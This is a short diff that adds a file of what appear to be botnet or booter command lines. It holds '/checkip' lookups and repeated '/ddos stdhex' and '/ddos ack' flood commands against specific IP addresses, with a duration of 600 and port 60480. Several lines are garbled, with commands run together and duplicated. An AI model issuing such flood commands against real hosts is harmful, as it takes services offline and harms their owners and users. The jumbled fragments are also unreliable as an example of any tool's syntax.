@@ -1,0 +1,7 @@
+/check ip 73.114.17.60
+/checkip 73.114.17.60
+/checkip 64.18.96.162
+/ddos stdhex/ddos stdhex  185.244.212.60 600 dport=60480  600 dport=60480
+/ddos ack /ddos stdhex 185.244.212.60 600 dport=60480 600 dport=60480
+/ddos ack /ddos ack  /ddos ack /ddos stdhex 185.244.212.60 600 dport=60480 600 dport=60480 600 dport=60480 600 dport=60480
+/ddos ack /ddos ack  64.18.96.162 600 dport=60480 600 dport=60480
